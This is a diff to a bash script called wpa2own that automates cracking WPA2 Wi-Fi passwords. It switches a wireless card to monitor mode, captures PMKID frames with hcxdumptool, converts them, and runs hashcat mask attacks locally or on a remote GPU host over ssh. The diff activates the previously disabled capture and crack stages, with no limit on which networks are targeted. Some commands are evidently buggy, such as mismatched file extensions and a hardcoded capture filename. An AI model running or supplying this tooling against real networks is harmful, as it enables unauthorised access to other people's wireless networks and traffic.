@@ -3,20 +3,29 @@
 set -e
 
 ####
-#### wpa2own 
-#### For details, usage, gotchas and license
-#### see: https://github.com/philcryer/wpa2own
+####   wpa2own   (crack WPA2 pre-shared keys) 
+####
+#### For details, usage, gotchas, and license
+#### see https://github.com/philcryer/wpa2own
 ####
 
 ####
 #### Variables
 ####
-# SET remote host varibles to run hashcat on
-remote_host="host.name.com"
-remote_user="luser"
+# Run hashcat to crack passwords remotely?
+# TODO get local, CPU hashing working
+#remote_hashing="no"
+remote_hashing="yes"
+
+# If "yes" set the following remote variables
+#remote_host="host.name.com"
+#remote_user="luser"
+#remote_port="22"
+remote_host="192.168.1.5"
+remote_user="phil"
 remote_port="22"
 
-# SET package capture file maximum size in megabytes
+# Maximum package capture file size in megabytes
 pcap_max_size="10"
 
 # no need to modify the following variables
@@ -96,8 +105,7 @@ EOF
 echo "   v`cat VERSION` |_| `shuf -n 1 txt/slogans`"
 }
 
-wpa2own_preflight(){
-    	# verify that system is compatible 
+stage0_preflight(){
 	echo -n "$prompt_adj" "  System: "
 	if [ $this_uname != "Linux" ]; then
 		echo "failed";echo "$prompt_error" "  Error: this script only supports Linux"
@@ -114,14 +122,11 @@ wpa2own_preflight(){
 	else
 		echo "$this_arch $prompt_okstatus"
 	fi
-
-    # check for required cli tools
-    for cli in git curl make bash sudo shuf; do
+    for cli in git curl make bash sudo rsync shuf; do
 	if type "$cli" > /dev/null 2>&1; then
 		echo -n "$prompt_adj" "  Apps: $cli "
 		echo "$prompt_okstatus"
 	fi	
-
         if ! type "$cli" > /dev/null 2>&1; then
 	    echo "failed";echo "$prompt_error" "  Error: $cli not installed or in the PATH. Aborting." 
             exit 1
@@ -153,18 +158,18 @@ function stage1-config(){
 		echo "$prompt_okstatus"
 	fi
 
-	#if [ ! -f "bin/hashcat-legacy" ]; then
-	#	echo "$prompt_adj" "      installing hashcat-legacy"
-	#	cd src
-	#	if [ ! -d "hashcat-legacy" ]; then
-	#		git clone https://github.com/hashcat/hashcat-legacy.git
-	#	fi
-	#	cd hashcat-legacy
-	#	#sudo ./tools/deps.sh
-	#	make linux64
-	#	mv hashcat-cli64.bin ../../bin/hashcat-legacy
-	#	cd ../..
-	#fi
+	if [ ! -f "bin/hashcat-legacy" ]; then
+	    echo "$prompt_adj" "  Software: hashcat-legacy"
+		cd src
+		if [ ! -d "hashcat-legacy" ]; then
+			git clone https://github.com/hashcat/hashcat-legacy.git
+		fi
+		cd hashcat-legacy
+		#sudo ./tools/deps.sh
+		make linux64
+		mv hashcat-cli64.bin ../../bin/hashcat-legacy
+		cd ../..
+	fi
 
 	echo -n "$prompt_adj" "  Software: hashcat "
 	if [ ! -f "bin/hashcat" ]; then
@@ -175,11 +180,12 @@ function stage1-config(){
 		fi
 		cd hashcat
 		git submodule update --init
-	# only build on the server we're going to run on
-	#	make
-	#	mv hashcat ../../bin/
-	#	cd ../..
-        else
+        cp -R OpenCL ../../bin/
+		make
+		cp hashcat* ../../bin/
+		cd ../..
+		echo "$prompt_okstatus"
+    else
 		echo "$prompt_okstatus"
 	fi
 
@@ -195,7 +201,7 @@ function stage1-config(){
         else
 		echo "$prompt_okstatus"
 	fi
-	echo -n "$prompt_adj" "  Software: making all binaries executeable "
+	echo -n "$prompt_adj" "  Software: making binaries executable "
 	chmod a+x bin/*
 	echo "$prompt_okstatus"
 }
@@ -205,51 +211,51 @@ function stage2-capture(){
 	# TODO maybe use iwconfig to guess wireless nic?
 	my_interface=$(./bin/hcxdumptool -I | tail -n1 | cut -d" " -f2)
 	# NOTE if this fails, you might have to hardcode this like:
-	#my_interface="wlan0"
+	#my_interface="wlan1"
+	# but remember; it has to support monitor mode, else you will fail!
 
-	# turn on monitor mode - again, your networking interface must support monitor mode
-	# if it doesn't, this will fail, and everything else will too :(
+	# Turn on monitor mode, for the last time - your nic must support monitor mode!
 	sudo ip link set $my_interface down
 	sudo iw dev $my_interface set type monitor
 	#sudo rfkill unblock all
 	sudo ip link set $my_interface up
 
-	# clear existing pcap if found
-	#if [ ! -f "out/$timestamp.pcapng" ]; then rm -f out/$timestamp.pcapng; fi
-
-	echo "$prompt_adj" "  running package capture on interface $my_interface"
-	echo "$prompt_adj" "  run this for at least 10 minutes, look for the message"
-	echo "$prompt_adj" "  look for the message [FOUND PMKID] then hit control-c"
-	cd out
-
-	# TODO create filterlist if APs?
+	echo "$prompt_adj" "  Hcxdumptool: running capture on interface $my_interface"
+	echo "$prompt_adj" "  Hcxdumptool: run this for ~10 minutes, looking for the message:"
+	echo "$prompt_adj" "  Hcxdumptool: [FOUND PMKID] then hit control-c to stop and continue"
+	# TODO create filterlist if APs if we don't want to hack some? So like a whitelist, but is this needed even?
 	#sudo ./hcxdumptool -o new.pcapng -i $my_interface --enable_status=1 --filtermode=2 --filterlist=filter.txt
-
 	# run hcxdumptool to capture traffic, build a pcap
-	sudo ../bin/hcxdumptool -o $timestamp.pcapng -i $my_interface --enable_status=1
+	cd out; sudo ../bin/hcxdumptool -o $timestamp.pcapng -i $my_interface --enable_status=1
+
+    # Turn of capture interface
+	sudo ip link set $my_interface down
 
 	# TODO have it create more output (needs testing)
-	#../bin/hcxpcaptool -E essidlist -I identitylist -U usernamelist -z $timestamp.16800 $timestamp.pcapng
+	echo "$prompt_adj" "  Hcxpcaptool: converting frame to has for hashcat"
+	../bin/hcxpcaptool -E essidlist -I identitylist -U usernamelist -z $timestamp.16800 $timestamp.pcapng
 }
 
 function stage3-crack(){
-	echo "$prompt_adj" "  transferring file $timestamp.pcapng to GPU rig for cracking"
-	#echo "** using hashcat to try and get the WPA PSK **"
-	#echo "$prompt_adj" "  - running hashcat across package capture file"
-	#../bin/hashcat -m 16800 $timestamp.16800 -a 3 -w 3 '?l?l?l?l?l?lt!'
-	# or ./bin/hashcat-legacy $timestamp.pcapng -a 3 '?l?l?l?l?l?lt!'
-	echo "$prompt_adj" "  NOTE this manual for now. Transfer the file to the remote system"
-	echo "$prompt_adj" "  then run: hashcat $timestamp.pcapng -a 3 '?l?l?l?l?l?lt!'"
-exit 0
-	# scp files to remote host
-	# make directory on remote host
- 	ssh -p $remote_port $remote_host@$remote_user -C 'mkdir -p $HOME/wpa2own/bin'
-	# copy files to remote host
- 	scp -P $remote_port -r out src/hashcat $remote_host@$remote_user:$HOME/wpa2own
-	# compile hashcat on remote host
- 	ssh -p $remote_port $remote_host@$remote_user -C 'cd $HOME/wpa2own/hashcat; make; chmod 755 hashcat; mv hashcat ../bin'
-	# run hashcat on remote host
- 	ssh -p $remote_port $remote_host@$remote_user -C 'cd $HOME/wpa2own; ./bin/hashcat out/$timestamp.pcapng -a 3 '?l?l?l?l?l?lt!'
+    if [ "$remote_hashing" == "no" ]; then
+	    echo "$prompt_adj" "  Cracking: running hashcat against $timestamp.pcapng"
+        #./bin/hashcat-legacay -m 16800 out/$timestamp.168000 -a 3 -w 3 '?l?l?l?l?l?lt!''
+        ./bin/hashcat-legacy out/1534471605.16800
+        exit 0
+    fi
+
+    if [ "$remote_hashing" == "yes" ]; then
+	    echo -n "$prompt_adj" "  Transferring: files to remote host for hashing "
+ 	    rsync -q -avz -e "ssh -p $remote_port" ./ $remote_user@$remote_host:$HOME/wpa2own
+		echo "$prompt_okstatus"
+
+        # TODO build hashcat binary on remote node? (may need some build pkgs from apt-get in README.md, but could be faster if optimized there?)
+        #ssh -p $remote_port $remote_user@$remote_host -C 'cd $HOME/wpa2own/src/hashcat; make; chmod 755 hashcat*; mv hashcat* $HOME/wpa2own/bin'
+
+	    echo -n "$prompt_adj" "  Hashing: running hashcat on remote server "
+		echo "$prompt_okstatus"
+        ssh -p $remote_port $remote_user@$remote_host -C 'cd $HOME/wpa2own; ./bin/hashcat -m 16800 out/$timestamp.168000 -a 3 -w 3 '?l?l?l?l?l?lt!''
+    fi
 }
 
 ####
@@ -258,16 +264,16 @@ exit 0
 clear; rainbowsh; rainbowsh_prompt; wpa2own_logo 
 echo;echo "$prompt_start"
 
-echo "$prompt_verb" "Stage 0 - preflight"
-wpa2own_preflight
+echo "$prompt_verb" "Stage 0 - Preflight"
+stage0_preflight
 
-echo "$prompt_verb" "Stage 1 - gathering"
+echo "$prompt_verb" "Stage 1 - Config"
 stage1-config
 
-echo "$prompt_verb" "Stage 2 - discovering"
-#stage2-capture
+echo "$prompt_verb" "Stage 2 - Capture"
+stage2-capture
 
-echo "$prompt_verb" "Stage 3 - cracking"
+echo "$prompt_verb" "Stage 3 - Crack"
 stage3-crack
 
 echo "$prompt_end"
